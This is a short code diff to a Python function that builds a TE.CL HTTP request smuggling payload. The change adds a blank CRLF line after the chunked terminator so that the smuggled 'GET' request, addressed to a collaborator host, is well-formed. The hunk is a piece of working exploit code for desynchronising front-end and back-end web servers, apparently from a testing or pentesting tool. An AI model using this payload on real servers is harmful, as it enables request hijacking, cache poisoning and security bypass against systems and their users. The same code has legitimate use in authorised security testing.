@@ -33,6 +33,7 @@ def te_cl_smuggling(url, collaborator_url, path):
     }
     body = (
         "0\r\n"
+        "\r\n"
         f"GET /{path} HTTP/1.1\r\n"
         f"Host: {collaborator_url}\r\n"
         "Connection: close\r\n"
